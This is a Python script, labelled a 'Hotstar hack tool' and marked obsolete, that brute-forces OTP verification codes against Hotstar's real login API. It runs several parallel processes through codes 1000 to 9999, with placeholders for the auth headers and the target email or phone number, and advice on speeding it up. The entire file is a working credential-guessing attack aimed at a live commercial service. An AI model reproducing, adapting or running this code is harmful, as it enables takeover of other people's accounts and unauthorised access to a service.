# HOTSTAR HACK TOOL - BRUTEFORCE (OBSOLETE)
# Author<Name> : CLP (Chethas L Pramod)
# Author<Email> : lchethas@gmail.com
# 
# TODO : Fill all the required fields.


import requests
import multiprocessing 
import time
import sys

url = "https://api.hotstar.com/um/v3/users/login?login-by=phone_otp"

headers={
	'content-type':'application/json',
	'hotstarauth':'[ ENTER hotstarauth HERE ]',
	'origin':'https://www.hotstar.com',
	'referer':'https://www.hotstar.com/',
	'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
	'x-hs-device-id':'[ ENTER x-hs-device-i HERE ]',
	'x-hs-platform':'PCTV',
	'x-hs-usertoken':'[ ENTER x-hs-device-i HERE ]',
	'x-request-id':'[ ENTER x-request-id HERE ]',
	'x-country-code':'IN',
	'x-hs-appversion':'6.96.0'
}
head2={
	'access-control-allow-credentials':'true',
	'access-control-allow-headers':'content-type,hotstarauth,x-country-code,x-hs-appversion,x-hs-device-id,x-hs-platform,x-hs-usertoken,x-request-id',
	'access-control-allow-methods':'PUT',
	'origin':'https://www.hotstar.com',
	'referer':'https://www.hotstar.com/',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36'
}

ts =[]

email = '[ ENTER YOUR EMAIL HERE ]'
#  ++===== OR ======++
pn = "[ ENTER YOUR PHONE NUMBER HERE ]"

def bfh(s,e):
	for i in range(s,e):
		pl2 = {'phone_number':pn,'verification_code': i}
		pl1 = {'email':email,'verification_code': i}
		ops2 = requests.options(url,headers = head2)

		# ++==== CHANGE pl1 TO pl2  IF YOU ARE USING PHONE NUMBER FOR AUTH ====++
		req2 = requests.put(url,json=pl1,headers=headers)
		if req2.status_code == 403:
			print("403")
			for t in ts:
				t.terminate() 
			break
		elif req2.status_code == 200:
			for t in ts:
				t.terminate()
			print("Success : " + str(i) + " : data: " + req2.text )
			break
		elif req2.status_code == 429:
			for t in ts:
				t.terminate()
			print("Error 429 : " + str(i) + " : data: " + req2.text )
			break
		print(str(req2.status_code) + " : " + str(i))
		sys.stdout.flush()
		time.sleep(0.2)

si = 1000
# ++=== INCREASE THIS IF YOU WANT TO DO IT FASTER ===++
total_processes = 6 

if __name__ == '__main__':
	for its in range(0,total_processes):
		e = si + round(9000/total_processes)
		t = multiprocessing.Process(target=bfh, args=(si,e))
		t.start()
		ts.append(t)
		si = e
		print("Started Process "+ str(its))





